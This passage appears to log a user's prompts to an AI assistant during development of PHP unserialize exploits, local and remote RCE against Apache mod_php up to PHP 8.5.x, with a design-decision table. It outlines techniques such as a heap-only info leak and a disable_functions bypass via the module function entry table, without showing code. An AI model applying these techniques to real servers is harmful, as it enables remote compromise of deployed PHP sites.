could you write a "local" exploit as described in getfree writeups first ?
```

```
um.. no we cant use /proc/self/mem
```

```
you can not use anything in /proc/ ... no maps nothing from proc.
```

The GetFree writeup was provided as the reference standard for offset-free exploitation:

```
what about using the getfree method ...?
https://raw.githubusercontent.com/lcfr-eth/exploits/refs/heads/main/getfree/php_7_8_exploit.md
```

The constraint was sharpened, no hardcoded binary offsets, only struct member offsets:

```
but wait .. are these offsets per binary ? if it is recompiled will they change
```

```
there are certain offsets which are acceptable... as seen in the getfree
exploit. such as struct offsets / member offsets of a struct. but that
should be it.
```

Cross-version support was required:

```
can we also exploit the latest php 8.5.x version ?
```

After an initial version with hardcoded offsets was built and tested:

```
you should only document the generic method remove the previous exploitation
```

## Phase 5: Remote Exploitation

```
okay now we need to create a remote exploit using our
var_dump(@unserialize(...)) how we were doing originally ..
```

```
no we should not disable aslr... the remote exploitation probably needs
to be done differently than the local as well..
```

```
you should be able to resolve everything remotely.. the only thing which
you can use are struct offsets per php version.
```

The remote app was simplified to match a realistic attack surface:

```
i think the remote_app is being much too custom .. it should mostly just
have the classes to trigger the bug + a
var_dump(@unserialize($_REQUEST['cook']))
```

The target was Apache mod_php, matching real-world deployment:

```
you should be using apache + php
```

```
you should also exploit the latest version php 8.5.x
```

After the remote chain was working through libc resolution:

```
php8_remote.py is latest and allreading works i think .. we need the
write -> rce
```

## Phase 6: disable_functions Bypass

After the remote exploit used libc `system()`, the user pushed for the local exploit to bypass `disable_functions` without libc:

```
what - i dont think we should be calling libc system .. why not just find
the system zif_function handler
```
```
you should reference the getfree.
```

This led to the module function entry table walk, navigating from `var_dump`'s module pointer to the standard module's static `zend_function_entry[]` array to read the original `zif_system` handler, bypassing the runtime disable entirely.


## Key Design Decisions Driven by User Feedback

| User Prompt | Design Impact |
|-------------|---------------|
| "you can not use anything in /proc/" | Forced heap-only info leak chain (Closure spray + gc pattern scan) |
| "struct offsets only" | Eliminated all `/proc/self/maps`, ELF parsing, and symbol table lookups from local exploit |
| "you should re-read the getfree" | Adopted module function entry table walk for disable_functions bypass |
| "should also exploit the latest php 8.5.x" | Required auto-detecting EG.function_table offset (0x1b0 vs 0x1c8) |
| "you should be using apache + php" | Remote exploit targets prefork MPM with crash-and-respawn oracle |
| "why not just find the system zif_function handler" | Led to module walk bypass instead of libc vtable hijack |
| "should mostly just have the classes + var_dump(@unserialize(...))" | Realistic attack surface, single endpoint, no special response format |
